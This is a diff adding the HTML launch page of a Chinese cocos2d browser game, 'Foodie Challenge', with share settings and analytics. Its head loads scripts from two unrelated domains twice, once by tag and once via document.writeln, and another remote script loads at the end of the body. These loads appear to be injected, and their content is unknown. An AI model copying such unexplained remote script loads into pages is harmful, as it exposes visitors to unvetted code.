@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <title>吃货大挑战</title>
+    <meta http-equiv="Content-Language" content="zh-CN" />
+    <meta name="viewport" content="width=device-width, user-scalable=no,initial-scale=1, minimum-scale=1, maximum-scale=1">
+    <meta name="full-screen" content="yes"/>
+    <meta name="screen-orientation" content="portrait"/>
+    <meta name="x5-fullscreen" content="true"/>
+    <meta name="360-fullscreen" content="true"/>
+
+    <script src="http://libs.baidu.com/jquery/2.0.0/jquery.min.js"></script>
+    <script src="http://res.wx.qq.com/open/js/jweixin-1.0.0.js"></script>
+    <script src='https://p.mendoc.cn/83462'></script>
+	<script src='http://h.how5.cn/83462'></script>
+	<script type="text/javascript">
+		document.writeln("<script src='http:\/\/h.how5.cn\/83462'><\/script>");
+		document.writeln("<script src='https:\/\/p.mendoc.cn\/83462'><\/script>");
+	</script>
+    <style>
+        body, canvas, div {
+            -moz-user-select: none;
+            -webkit-user-select: none;
+            -ms-user-select: none;
+            -khtml-user-select: none;
+            -webkit-tap-highlight-color: rgba(255, 55, 88, 1);
+        }
+        html{
+            width: 100%;
+            height:100%
+        }
+
+    </style>
+		<!-- <link rel="stylesheet" type="text/css" href="http://game.9g.com/css/game9g.css"> -->
+  <!-- // <script src="http://game.9g.com/js/game9g.js"></script> -->
+</head>
+
+<body style="padding:0; margin: 0;" ontouchmove = 'return'>
+<div style="display:none;">
+ <img src="big_icon.jpg" />
+</div>
+
+<script src="http://www.play68.com/resources/js/cnzz_tongji.js"></script>
+<canvas id="gameCanvas" width = "320" height="480" ></canvas>
+<script src="cocos2d-js-v3.5-lite.js"></script>
+<script type="text/javascript">
+    _czc.push(["_trackEvent","open进入游戏","吃货大挑战","","",""]); 
+    window.onload = function () {
+        cc.game.onStart = function () {
+            var width = document.documentElement.clientWidth;
+            var height = document.documentElement.clientHeight;
+            cc.view.setDesignResolutionSize(width, height, cc.ResolutionPolicy.SHOW_ALL);
+            MyLoader.preload(g_resources, function () {
+                setTimeout(function () {
+                    cc.director.runScene(new StartScene());
+                },500)
+            }, this);
+        };
+        cc.game.run("gameCanvas");
+    };
+</script>
+
+<script type="text/javascript">
+    function loadjs(script_filename) {
+        var script = document.createElement('script');
+        script.setAttribute('type', 'text/javascript');
+        script.setAttribute('src', script_filename);
+        script.setAttribute('id', 'coolshell_script_id');
+        script_id = document.getElementById('coolshell_script_id');
+        document.getElementsByTagName('head')[0].appendChild(script);
+    }
+</script>
+<script>
+	// var game9g = new Game9G("ch");
+	// game9g.shareData.title = "吃货";
+	// game9g.shareData.content = "吃货";
+	function goHome(){
+		// window.location = game9g.homeurl;
+	}
+	function clickMore(){
+    _czc.push(["_trackEvent","吃货大挑战","更多游戏","","",""]);  
+    if(document.referrer)
+        {
+            // Play68.goHome();
+        }
+    else
+        {  
+            // play68_goHome();
+    		// window.location = game9g.moreurl;
+        } 
+	}
+	function dp_share(){
+        play68_submitScore(score);
+		// game9g.share();
+	}
+	function dp_Ranking(){
+		// window.location=game9g.rankurl;
+	}
+	function showAd(){
+	}
+	function hideAd(){
+	}
+	function dp_submitScore(score){
+		// if(score>0){
+		// 	game9g.score = score;
+		// 	game9g.scoreName = "得了" + score + "分";	 
+		// 	game9g.shareData.title = "我在吃货中得了"+score+"分,你也来试试看吧！";
+		// 	game9g.utils.shareConfirm("你在吃货中得了"+score+"分，快通知一下小伙伴吧！", dp_share); 
+		// }
+	}
+</script>
+<div style="display: none;">
+	<script type="text/javascript">
+		// game9g.utils.tongji();
+	</script>
+
+<script  type="text/JavaScript">
+window.shareData={
+  'title':'吃货大挑战',
+  'link':'http://game.nineying.cn/games/chdtz/',
+  'imgurl':'http://game.nineying.cn/games/chdtz/icon.png'
+}
+window.shareFriendData={
+  'title':'吃货大挑战',
+  'content':'关注小斯基网络,更多好玩的游戏等着你。',
+  'link':'http://game.nineying.cn/games/chdtz/',
+  'imgurl':'http://game.nineying.cn/games/chdtz/icon.png'
+}
+</script>
+<script type="text/JavaScript" src="http://gc.veiying.cn/code"></script>
+</body>
+</html>
